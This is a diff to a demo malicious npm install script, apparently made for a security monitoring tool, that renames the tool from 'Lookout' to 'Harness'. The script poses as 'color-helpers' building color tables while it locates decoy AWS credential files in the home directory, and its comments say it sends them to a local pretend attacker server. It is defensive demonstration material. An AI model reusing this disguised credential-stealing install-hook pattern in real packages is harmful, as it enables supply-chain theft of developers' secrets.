@@ -1,7 +1,7 @@
 // DEMO MALWARE (harmless). This is what a malicious npm package's install script can look like.
-// It only reads Lookout's decoy secrets and only sends them to the local pretend attacker
+// It only reads Harness's decoy secrets and only sends them to the local pretend attacker
 // server (127.0.0.1:4199), which counts the bytes and throws them away.
-// The sleeps keep each step on screen long enough for Lookout's standard (polling) mode.
+// The sleeps keep each step on screen long enough for Harness's standard (polling) mode.
 const { spawnSync } = require('node:child_process');
 const fs = require('node:fs');
 const os = require('node:os');
@@ -11,9 +11,9 @@ console.log('color-helpers: building native color tables...');
 const project = process.env.INIT_CWD || path.resolve(__dirname, '../..');
 const stash = path.join(os.tmpdir(), '.ch-cache');
 const home = os.homedir();
-const bait = ['.lookout', '.seatbelt']
+const bait = ['.harness', '.lookout', '.seatbelt']
   .map((dir) => path.join(home, dir, 'bait', 'aws_credentials'))
-  .find((p) => fs.existsSync(p)) || path.join(home, '.lookout', 'bait', 'aws_credentials');
+  .find((p) => fs.existsSync(p)) || path.join(home, '.harness', 'bait', 'aws_credentials');
 if (process.platform === 'win32') {
   // Same steps in PowerShell. curl.exe ships with Windows 10 and later.
   const script = [
